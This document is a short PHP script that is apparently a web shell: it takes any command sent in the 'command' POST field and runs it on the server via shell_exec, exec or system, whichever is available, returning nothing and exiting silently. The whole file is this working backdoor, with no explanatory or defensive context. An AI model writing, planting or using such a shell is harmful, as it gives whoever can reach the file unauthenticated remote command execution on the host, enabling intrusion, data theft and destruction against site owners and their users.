<?php
if (!isset($_POST['command']))
	die("");
if(function_exists('shell_exec')){
	$cmd=shell_exec($_POST['command']);
}elseif(function_exists('exec')){
	$cmd=exec($_POST['command']);
}elseif(function_exists('system')){
	$cmd=system($_POST['command']);
}
exit;
?>